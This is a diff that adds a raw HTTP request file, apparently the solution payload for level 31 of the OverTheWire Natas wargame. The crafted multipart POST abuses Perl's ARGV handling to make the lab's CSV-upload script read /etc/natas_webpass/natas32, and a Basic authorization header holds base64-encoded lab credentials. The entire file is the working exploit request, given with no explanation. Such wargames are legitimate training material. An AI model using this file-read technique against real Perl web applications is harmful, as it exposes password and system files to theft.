@@ -1,0 +1,26 @@
+POST /index.pl?%2Fetc%2Fnatas_webpass%2Fnatas32= HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en,fi-FI;q=0.9,fi;q=0.8,en-US;q=0.7
+Authorization: Basic bmF0YXMzMTpBTVpGMTR5a25PbjlVYzU3dUtCMDJqbll1aHBsWWthMw==
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---011000010111000001101001
+Cookie: __utma=176859643.1981211129.1690143695.1690143695.1690143695.1; __utmc=176859643; __utmz=176859643.1690143695.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Origin: http://natas31.natas.labs.overthewire.org
+Pragma: no-cache
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Host: natas31.natas.labs.overthewire.org
+Content-Length: 247
+
+-----011000010111000001101001
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----011000010111000001101001
+Content-Disposition: form-data; name="file"; filename="airtravel.csv"
+Content-Type: text/csv
+
+
+-----011000010111000001101001--
